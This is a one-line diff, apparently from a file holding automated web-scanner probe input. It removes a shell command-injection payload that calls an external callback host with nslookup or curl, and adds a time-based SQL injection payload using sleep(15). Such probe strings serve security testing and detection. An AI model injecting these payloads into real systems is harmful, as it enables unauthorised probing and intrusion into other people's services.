@@ -1,1 +1,1 @@
-$(nslookup -q=cname hitaatxmzcuxk179f9.bxss.me||curl hitaatxmzcuxk179f9.bxss.me)
+555*if(now()=sysdate(),sleep(15),0)
